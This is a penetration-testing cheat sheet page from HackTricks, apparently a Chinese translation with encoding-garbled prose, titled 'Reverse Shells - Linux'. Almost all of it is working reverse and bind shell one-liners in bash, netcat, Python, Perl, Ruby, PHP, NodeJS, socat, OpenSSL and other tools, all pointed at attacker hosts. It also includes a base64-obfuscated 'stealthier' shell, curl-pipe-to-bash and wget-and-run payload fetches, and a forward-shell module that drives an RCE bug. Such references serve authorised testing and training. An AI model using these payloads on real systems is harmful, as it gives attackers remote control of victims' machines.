<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Reverse Shells - Linux</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="shells---linux"><a class="header" href="#shells---linux">Shells - Linux</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<p><strong>å¦‚æœä½ å¯¹è¿™äº› shell æœ‰ä»»ä½•ç–‘é—®ï¼Œå¯ä»¥æŸ¥çœ‹</strong> <a href="https://explainshell.com"><strong>https://explainshell.com/</strong></a></p>
<h2 id="full-tty"><a class="header" href="#full-tty">Full TTY</a></h2>
<p><strong>ä¸€æ—¦ä½ è·å¾—äº†åå‘ shell</strong><a href="full-ttys.html"> <strong>è¯·é˜…è¯»æ­¤é¡µé¢ä»¥è·å–å®Œæ•´ TTY</strong></a><strong>.</strong></p>
<h2 id="bash--sh"><a class="header" href="#bash--sh">Bash | sh</a></h2>
<pre><code class="language-bash">curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
bash -i &gt;&amp; /dev/udp/127.0.0.1/4242 0&gt;&amp;1 #UDP
0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt;; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
exec 5&lt;&gt;/dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt;; while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done

#Short and bypass (credits to Dikline)
(sh)0&gt;/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec &gt;&amp;0
</code></pre>
<p>ä¸è¦å¿˜è®°æ£€æŸ¥å…¶ä»– shellï¼šshã€ashã€bshã€cshã€kshã€zshã€pdkshã€tcsh å’Œ bashã€‚</p>
<h3 id="ç¬¦å·å®‰å…¨-shell"><a class="header" href="#ç¬¦å·å®‰å…¨-shell">ç¬¦å·å®‰å…¨ shell</a></h3>
<pre><code class="language-bash">#If you need a more stable connection do:
bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i &gt;&amp; /dev/tcp/10.8.4.185/4444 0&gt;&amp;1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2&gt;/dev/null
</code></pre>
<h4 id="shell-è§£é‡Š"><a class="header" href="#shell-è§£é‡Š">Shell è§£é‡Š</a></h4>
<ol>
<li><strong><code>bash -i</code></strong>: è¯¥å‘½ä»¤çš„è¿™ä¸€éƒ¨åˆ†å¯åŠ¨ä¸€ä¸ªäº¤äº’å¼ï¼ˆ<code>-i</code>ï¼‰Bash shellã€‚</li>
<li><strong><code>&gt;&amp;</code></strong>: è¯¥å‘½ä»¤çš„è¿™ä¸€éƒ¨åˆ†æ˜¯<strong>å°†æ ‡å‡†è¾“å‡º</strong>ï¼ˆ<code>stdout</code>ï¼‰å’Œ<strong>æ ‡å‡†é”™è¯¯</strong>ï¼ˆ<code>stderr</code>ï¼‰<strong>é‡å®šå‘åˆ°åŒä¸€ç›®æ ‡</strong>çš„ç®€å†™è¡¨ç¤ºæ³•ã€‚</li>
<li><strong><code>/dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt;</code></strong>: è¿™æ˜¯ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶ï¼Œ<strong>è¡¨ç¤ºä¸æŒ‡å®šIPåœ°å€å’Œç«¯å£çš„TCPè¿æ¥</strong>ã€‚</li>
</ol>
<ul>
<li>é€šè¿‡<strong>å°†è¾“å‡ºå’Œé”™è¯¯æµé‡å®šå‘åˆ°æ­¤æ–‡ä»¶</strong>ï¼Œè¯¥å‘½ä»¤æœ‰æ•ˆåœ°å°†äº¤äº’å¼shellä¼šè¯çš„è¾“å‡ºå‘é€åˆ°æ”»å‡»è€…çš„æœºå™¨ã€‚</li>
</ul>
<ol start="4">
<li><strong><code>0&gt;&amp;1</code></strong>: è¯¥å‘½ä»¤çš„è¿™ä¸€éƒ¨åˆ†<strong>å°†æ ‡å‡†è¾“å…¥ï¼ˆ<code>stdin</code>ï¼‰é‡å®šå‘åˆ°ä¸æ ‡å‡†è¾“å‡ºï¼ˆ<code>stdout</code>ï¼‰ç›¸åŒçš„ç›®æ ‡</strong>ã€‚</li>
</ol>
<h3 id="åˆ›å»ºæ–‡ä»¶å¹¶æ‰§è¡Œ"><a class="header" href="#åˆ›å»ºæ–‡ä»¶å¹¶æ‰§è¡Œ">åˆ›å»ºæ–‡ä»¶å¹¶æ‰§è¡Œ</a></h3>
<pre><code class="language-bash">echo -e '#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/1&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1' &gt; /tmp/sh.sh; bash /tmp/sh.sh;
wget http://&lt;IP attacker&gt;/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
</code></pre>
<h2 id="forward-shell"><a class="header" href="#forward-shell">Forward Shell</a></h2>
<p>å½“å¤„ç†åŸºäºLinuxçš„Webåº”ç”¨ç¨‹åºä¸­çš„**è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰**æ¼æ´æ—¶ï¼Œå®ç°åå‘shellå¯èƒ½ä¼šå—åˆ°ç½‘ç»œé˜²å¾¡çš„é˜»ç¢ï¼Œä¾‹å¦‚iptablesè§„åˆ™æˆ–å¤æ‚çš„æ•°æ®åŒ…è¿‡æ»¤æœºåˆ¶ã€‚åœ¨è¿™ç§å—é™ç¯å¢ƒä¸­ï¼Œå¦ä¸€ç§æ–¹æ³•æ˜¯å»ºç«‹ä¸€ä¸ªPTYï¼ˆä¼ªç»ˆç«¯ï¼‰shellï¼Œä»¥æ›´æœ‰æ•ˆåœ°ä¸è¢«æ”»é™·çš„ç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚</p>
<p>ä¸ºæ­¤æ¨èçš„å·¥å…·æ˜¯<a href="https://github.com/n3rada/toboggan.git">toboggan</a>ï¼Œå®ƒç®€åŒ–äº†ä¸ç›®æ ‡ç¯å¢ƒçš„äº¤äº’ã€‚</p>
<p>è¦æœ‰æ•ˆä½¿ç”¨tobogganï¼Œè¯·åˆ›å»ºä¸€ä¸ªé’ˆå¯¹ç›®æ ‡ç³»ç»ŸRCEä¸Šä¸‹æ–‡çš„Pythonæ¨¡å—ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªåä¸º<code>nix.py</code>çš„æ¨¡å—å¯ä»¥ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="language-python3">import jwt
import httpx

def execute(command: str, timeout: float = None) -&gt; str:
# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
token = jwt.encode(
{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&amp;L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
)

response = httpx.get(
url="https://vulnerable.io:3200",
headers={"Authorization": f"Bearer {token}"},
timeout=timeout,
# ||BURP||
verify=False,
)

# Check if the request was successful
response.raise_for_status()

return response.text
</code></pre>
<p>ç„¶åï¼Œæ‚¨å¯ä»¥è¿è¡Œï¼š</p>
<pre><code class="language-shell">toboggan -m nix.py -i
</code></pre>
<p>ä¸ºäº†ç›´æ¥åˆ©ç”¨äº¤äº’å¼ shellã€‚æ‚¨å¯ä»¥æ·»åŠ  <code>-b</code> ä»¥å®ç° Burpsuite é›†æˆï¼Œå¹¶åˆ é™¤ <code>-i</code> ä»¥è·å¾—æ›´åŸºæœ¬çš„ rce åŒ…è£…å™¨ã€‚</p>
<p>å¦ä¸€ä¸ªå¯èƒ½æ€§æ˜¯ä½¿ç”¨ <code>IppSec</code> çš„å‰å‘ shell å®ç° <a href="https://github.com/IppSec/forward-shell"><strong>https://github.com/IppSec/forward-shell</strong></a>ã€‚</p>
<p>æ‚¨åªéœ€ä¿®æ”¹ï¼š</p>
<ul>
<li>æ¼æ´ä¸»æœºçš„ URL</li>
<li>æ‚¨çš„æœ‰æ•ˆè´Ÿè½½çš„å‰ç¼€å’Œåç¼€ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰</li>
<li>å‘é€æœ‰æ•ˆè´Ÿè½½çš„æ–¹å¼ï¼ˆå¤´éƒ¨ï¼Ÿæ•°æ®ï¼Ÿé¢å¤–ä¿¡æ¯ï¼Ÿï¼‰</li>
</ul>
<p>ç„¶åï¼Œæ‚¨å¯ä»¥ç›´æ¥ <strong>å‘é€å‘½ä»¤</strong>ï¼Œç”šè‡³ <strong>ä½¿ç”¨ <code>upgrade</code> å‘½ä»¤</strong> æ¥è·å–å®Œæ•´çš„ PTYï¼ˆè¯·æ³¨æ„ï¼Œç®¡é“çš„è¯»å–å’Œå†™å…¥å¤§çº¦æœ‰ 1.3 ç§’çš„å»¶è¿Ÿï¼‰ã€‚</p>
<h2 id="netcat"><a class="header" href="#netcat">Netcat</a></h2>
<pre><code class="language-bash">nc -e /bin/sh &lt;ATTACKER-IP&gt; &lt;PORT&gt;
nc &lt;ATTACKER-IP&gt; &lt;PORT&gt; | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;ATTACKER-IP&gt; &lt;PORT&gt; &gt;/tmp/f
nc &lt;ATTACKER-IP&gt; &lt;PORT1&gt;| /bin/bash | nc &lt;ATTACKER-IP&gt; &lt;PORT2&gt;
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0&lt;/tmp/bkpipe | nc &lt;ATTACKER-IP&gt; &lt;PORT&gt; 1&gt;/tmp/bkpipe
</code></pre>
<h2 id="gsocket"><a class="header" href="#gsocket">gsocket</a></h2>
<p>åœ¨ <a href="https://www.gsocket.io/deploy/">https://www.gsocket.io/deploy/</a> æŸ¥çœ‹å®ƒ</p>
<pre><code class="language-bash">bash -c "$(curl -fsSL gsocket.io/x)"
</code></pre>
<h2 id="telnet"><a class="header" href="#telnet">Telnet</a></h2>
<pre><code class="language-bash">telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt; | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt; &gt;/tmp/f
telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt; | /bin/bash | telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt;
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0&lt;/tmp/bkpipe | telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt; 1&gt;/tmp/bkpipe
</code></pre>
<h2 id="whois"><a class="header" href="#whois">Whois</a></h2>
<p><strong>æ”»å‡»è€…</strong></p>
<pre><code class="language-bash">while true; do nc -l &lt;port&gt;; done
</code></pre>
<p>è¦å‘é€å‘½ä»¤ï¼Œè¯·å†™ä¸‹å®ƒï¼ŒæŒ‰å›è½¦ï¼Œç„¶åæŒ‰CTRL+Dï¼ˆä»¥åœæ­¢STDINï¼‰</p>
<p><strong>å—å®³è€…</strong></p>
<pre><code class="language-bash">export X=Connected; while true; do X=`eval $(whois -h &lt;IP&gt; -p &lt;Port&gt; "Output: $X")`; sleep 1; done
</code></pre>
<h2 id="python"><a class="header" href="#python">Python</a></h2>
<pre><code class="language-bash">#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
</code></pre>
<h2 id="perl"><a class="header" href="#perl">Perl</a></h2>
<pre><code class="language-bash">perl -e 'use Socket;$i="&lt;ATTACKER-IP&gt;";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
</code></pre>
<h2 id="ruby"><a class="header" href="#ruby">Ruby</a></h2>
<pre><code class="language-bash">ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
</code></pre>
<h2 id="php"><a class="header" href="#php">PHP</a></h2>
<pre><code class="language-php">// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
&lt;?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock), $pipes); ?&gt;

&lt;?php exec("/bin/bash -c 'bash -i &gt;/dev/tcp/10.10.14.8/4444 0&gt;&amp;1'"); ?&gt;
</code></pre>
<h2 id="java"><a class="header" href="#java">Java</a></h2>
<pre><code class="language-bash">r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()
</code></pre>
<h2 id="ncat"><a class="header" href="#ncat">Ncat</a></h2>
<pre><code class="language-bash">victim&gt; ncat &lt;ip&gt; &lt;port,eg.443&gt; --ssl  -c  "bash -i 2&gt;&amp;1"
attacker&gt; ncat -l &lt;port,eg.443&gt; --ssl
</code></pre>
<h2 id="golang"><a class="header" href="#golang">Golang</a></h2>
<pre><code class="language-bash">echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go
</code></pre>
<h2 id="lua"><a class="header" href="#lua">Lua</a></h2>
<pre><code class="language-bash">#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"
#Windows &amp; Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
</code></pre>
<h2 id="nodejs"><a class="header" href="#nodejs">NodeJS</a></h2>
<pre><code class="language-javascript">(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/6767 0&gt;&amp;1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
</code></pre>
<h2 id="openssl"><a class="header" href="#openssl">OpenSSL</a></h2>
<p>æ”»å‡»è€… (Kali)</p>
<pre><code class="language-bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port&gt; #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port2&gt; #Here yo will be able to get the response
</code></pre>
<p>å—å®³è€…</p>
<pre><code class="language-bash">#Linux
openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT1&gt;|/bin/bash|openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT2&gt;

#Windows
openssl.exe s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT1&gt;|cmd.exe|openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT2&gt;
</code></pre>
<h2 id="socat"><a class="header" href="#socat"><strong>Socat</strong></a></h2>
<p><a href="https://github.com/andrew-d/static-binaries">https://github.com/andrew-d/static-binaries</a></p>
<h3 id="ç»‘å®š-shell"><a class="header" href="#ç»‘å®š-shell">ç»‘å®š shell</a></h3>
<pre><code class="language-bash">victim&gt; socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker&gt; socat FILE:`tty`,raw,echo=0 TCP:&lt;victim_ip&gt;:1337
</code></pre>
<h3 id="åå‘-shell"><a class="header" href="#åå‘-shell">åå‘ shell</a></h3>
<pre><code class="language-bash">attacker&gt; socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim&gt; socat TCP4:&lt;attackers_ip&gt;:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
</code></pre>
<h2 id="awk"><a class="header" href="#awk">Awk</a></h2>
<pre><code class="language-bash">awk 'BEGIN {s = "/inet/tcp/0/&lt;IP&gt;/&lt;PORT&gt;"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}' /dev/null
</code></pre>
<h2 id="finger"><a class="header" href="#finger">Finger</a></h2>
<p><strong>æ”»å‡»è€…</strong></p>
<pre><code class="language-bash">while true; do nc -l 79; done
</code></pre>
<p>è¦å‘é€å‘½ä»¤ï¼Œè¯·å†™ä¸‹å®ƒï¼ŒæŒ‰å›è½¦ï¼Œç„¶åæŒ‰CTRL+Dï¼ˆä»¥åœæ­¢STDINï¼‰</p>
<p><strong>å—å®³è€…</strong></p>
<pre><code class="language-bash">export X=Connected; while true; do X=`eval $(finger "$X"@&lt;IP&gt; 2&gt; /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@&lt;IP&gt; 2&gt; /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
</code></pre>
<h2 id="gawk"><a class="header" href="#gawk">Gawk</a></h2>
<pre><code class="language-bash">#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd&gt; "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |&amp; Service
Service |&amp; getline cmd
if (cmd) {
while ((cmd |&amp; getline) &gt; 0)
print $0 |&amp; Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
</code></pre>
<h2 id="xterm"><a class="header" href="#xterm">Xterm</a></h2>
<p>è¿™å°†å°è¯•é€šè¿‡6001ç«¯å£è¿æ¥åˆ°æ‚¨çš„ç³»ç»Ÿï¼š</p>
<pre><code class="language-bash">xterm -display 10.0.0.1:1
</code></pre>
<p>è¦æ•è·åå‘ shellï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ï¼ˆå°†ç›‘å¬ç«¯å£ 6001ï¼‰ï¼š</p>
<pre><code class="language-bash"># Authorize host
xhost +targetip
# Listen
Xnest :1
</code></pre>
<h2 id="groovy"><a class="header" href="#groovy">Groovy</a></h2>
<p>ç”± <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">frohoff</a> æ³¨æ„ï¼šJava åå‘ shell ä¹Ÿé€‚ç”¨äº Groovy</p>
<pre><code class="language-bash">String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
</code></pre>
<h2 id="å‚è€ƒæ–‡çŒ®"><a class="header" href="#å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</a></h2>
<ul>
<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">https://highon.coffee/blog/reverse-shell-cheat-sheet/</a></li>
<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell</a></li>
<li><a href="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/">https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></li>
</ul>
<p>{% hint style="success" %}
